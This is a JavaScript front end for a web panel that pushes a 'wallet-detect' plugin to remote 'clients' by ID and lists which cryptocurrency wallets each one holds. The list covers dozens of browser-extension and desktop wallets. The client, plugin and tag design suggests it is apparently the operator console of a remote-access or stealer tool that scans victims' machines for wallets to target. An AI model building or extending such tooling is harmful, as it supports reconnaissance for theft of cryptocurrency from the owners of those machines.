const params = new URLSearchParams(window.location.search);
const clientIdInput = document.getElementById("client-id");
const statusEl = document.getElementById("status");
const logEl = document.getElementById("log");
const rescanBtn = document.getElementById("rescan-btn");
const resultsSection = document.getElementById("results-section");
const walletsList = document.getElementById("wallets-list");

const pluginId = "wallet-detect";
const clientIdFromUrl = params.get("clientId") || "";
clientIdInput.value = clientIdFromUrl;

// Wallet icons mapping
const walletIcons = {
  "MetaMask": "🦊",
  "Phantom": "👻",
  "Binance Wallet": "🟡",
  "Binance Desktop": "🟡",
  "Coinbase Wallet": "🔵",
  "Trust Wallet": "🛡️",
  "Trust Wallet Desktop": "🛡️",
  "Brave Wallet": "🦁",
  "Exodus": "🚀",
  "Exodus Desktop": "🚀",
  "Electrum": "⚡",
  "Atomic Wallet": "⚛️",
  "Bitcoin Core": "₿",
  "Ethereum Wallet": "Ξ",
  "Monero GUI": "Ɱ",
  "Rabby": "🐰",
  "OKX Wallet": "⭕",
  "Math Wallet": "🔢",
  "Crypto.com Wallet": "💳",
  "Ronin Wallet": "⚔️",
  "TronLink": "🔺",
  "SafePal": "🔐",
  "TokenPocket": "🪙",
  "XDEFI Wallet": "❌",
  "Nami": "🌊",
  "Eternl": "♾️",
  "Keplr": "🌌",
  "Petra Aptos": "🪨",
  "Solflare": "☀️",
  "Slope": "📈",
  "Guarda": "🛡️",
  "Guarda Desktop": "🛡️",
  "Jaxx Liberty": "💎",
  "Jaxx Liberty Desktop": "💎",
  "BitKeep": "🔑",
  "Core": "🌀",
  "Coin98": "💯",
  "Clover": "🍀",
  "ioPay": "💰",
  "Wombat": "🐨",
  "NeoLine": "🔷",
  "Terra Station": "🌍",
  "Liquality": "💧",
  "Saturn": "🪐",
  "Guild": "🏰",
  "Talisman": "🧿",
  "Polymesh": "🔗",
  "Ledger Live": "🔐",
  "Trezor Suite": "🔒",
  "Coinomi": "🪙",
  "Edge Wallet": "🔷",
  "Wasabi Wallet": "🥷",
  "Samourai Wallet": "🥷",
  "Mycelium": "🍄",
  "Blockchain.com Desktop": "⛓️",
  "Zcash": "🔒",
  "Dash Core": "💨",
  "Litecoin Core": "Ł",
  "Dogecoin Core": "🐕",
  "Daedalus": "🏛️",
  "Yoroi": "🌸",
  "MultiBit": "💼",
  "Armory": "🛡️",
  "Bitcoin Knots": "🪢",
  "Sparrow Wallet": "🐦",
  "Specter Desktop": "👻",
  "BlueWallet": "💙",
  "Zap Wallet": "⚡",
  "Phoenix Wallet": "🔥",
  "Breez Wallet": "🌬️",
  "MetaMask (Firefox)": "🦊🔥",
  "Phantom (Firefox)": "👻🔥",
  "Binance Wallet (Firefox)": "🟡🔥",
  "Trust Wallet (Firefox)": "🛡️🔥",
};

function log(line) {
  const ts = new Date().toISOString().split('T')[1].split('.')[0];
  logEl.textContent = `[${ts}] ${line}\n` + logEl.textContent;
}

function setStatus(text, type) {
  statusEl.textContent = text;
  statusEl.className = `status ${type}`;
}

function displayWallets(wallets) {
  walletsList.innerHTML = "";
  
  if (!wallets || wallets.length === 0) {
    walletsList.innerHTML = `
      <div class="empty-state">
        <div class="empty-state-icon">🔍</div>
        <div class="empty-state-text">No cryptocurrency wallets detected</div>
      </div>
    `;
    return;
  }
  
  wallets.forEach(wallet => {
    const icon = walletIcons[wallet.walletType] || "💰";
    const item = document.createElement("div");
    item.className = "wallet-item";
    item.innerHTML = `
      <div class="wallet-icon">${icon}</div>
      <div class="wallet-info">
        <div class="wallet-name">${wallet.walletType}</div>
        <div class="wallet-location">${wallet.location}</div>
      </div>
    `;
    walletsList.appendChild(item);
  });
}

async function loadPlugin() {
  const clientId = clientIdInput.value.trim();
  if (!clientId) {
    log("Missing clientId");
    setStatus("Error: No client ID", "error");
    return;
  }
  
  try {
    setStatus("Loading plugin...", "loading");
    rescanBtn.disabled = true;
    
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/load`, {
      method: "POST",
    });
    
    if (!res.ok) {
      const text = await res.text();
      log(`Load failed: ${res.status} ${text}`);
      setStatus("Load failed", "error");
      rescanBtn.disabled = false;
      return;
    }
    
    log("Plugin loaded successfully");
    setStatus("Scanning for wallets...", "loading");
    
    // Wait for scan results
    setTimeout(checkStatus, 2000);
    
  } catch (err) {
    log(`Error: ${err.message}`);
    setStatus("Error", "error");
    rescanBtn.disabled = false;
  }
}

async function rescan() {
  const clientId = clientIdInput.value.trim();
  if (!clientId) {
    log("Missing clientId");
    return;
  }
  
  try {
    setStatus("Rescanning...", "loading");
    rescanBtn.disabled = true;
    
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "rescan", payload: {} }),
    });
    
    if (!res.ok) {
      const text = await res.text();
      log(`Rescan failed: ${res.status} ${text}`);
      setStatus("Rescan failed", "error");
      rescanBtn.disabled = false;
      return;
    }
    
    log("Rescan triggered");
    setTimeout(checkStatus, 2000);
    
  } catch (err) {
    log(`Error: ${err.message}`);
    setStatus("Error", "error");
    rescanBtn.disabled = false;
  }
}

async function checkStatus() {
  const clientId = clientIdInput.value.trim();
  if (!clientId) return;
  
  try {
    // Check client tags for crypto wallets
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}`);
    if (!res.ok) {
      log("Failed to fetch client data");
      setStatus("Error fetching data", "error");
      rescanBtn.disabled = false;
      return;
    }
    
    const data = await res.json();
    const cryptoTag = data.tags?.crypto;
    
    if (cryptoTag && cryptoTag !== "none") {
      const walletTypes = cryptoTag.split(",");
      log(`Found ${walletTypes.length} wallet(s): ${cryptoTag}`);
      setStatus(`${walletTypes.length} wallet(s) detected`, "success");
      
      // Display wallet cards
      const wallets = walletTypes.map(type => ({
        walletType: type.trim(),
        location: "See server logs for details",
        found: true
      }));
      displayWallets(wallets);
      resultsSection.style.display = "block";
    } else {
      log("No wallets detected");
      setStatus("No wallets found", "none");
      displayWallets([]);
      resultsSection.style.display = "block";
    }
    
    rescanBtn.disabled = false;
    
  } catch (err) {
    log(`Error: ${err.message}`);
    setStatus("Error", "error");
    rescanBtn.disabled = false;
  }
}

// Event listeners
rescanBtn.addEventListener("click", rescan);

// Auto-load on page load
if (clientIdFromUrl) {
  log("Initializing wallet detection...");
  loadPlugin();
}
